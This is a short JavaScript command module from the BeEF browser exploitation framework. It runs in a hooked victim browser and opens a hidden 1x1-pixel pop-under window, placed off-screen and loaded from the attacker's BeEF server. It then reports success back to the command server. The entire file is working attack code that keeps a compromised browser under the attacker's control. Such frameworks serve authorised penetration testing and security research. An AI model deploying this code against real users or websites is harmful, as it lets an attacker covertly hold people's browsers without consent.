//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
	
	var result = "Pop-under window successfully created!";

	window.open('http://' + beef.net.host + ':' + beef.net.port + '/demos/plain.html','popunder','toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=1,height=1,left='+screen.width+',top='+screen.height+'').blur();

	window.focus();	

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result);
});
